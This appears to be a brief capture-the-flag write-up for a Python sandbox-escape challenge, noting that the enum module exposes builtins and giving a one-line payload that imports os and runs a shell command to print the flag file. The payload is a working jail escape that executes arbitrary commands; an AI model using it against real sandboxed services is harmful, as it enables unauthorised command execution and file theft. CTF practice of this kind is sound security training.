# solve

lmao this is so easy but the chall looks so intimidating

they import enum which provides direct access to bltns (builtins) and also sys module lol

```py
import enum
enum.bltns.getattr(enum.bltns, '__import__')('os').system('cat /app/flag*')
```

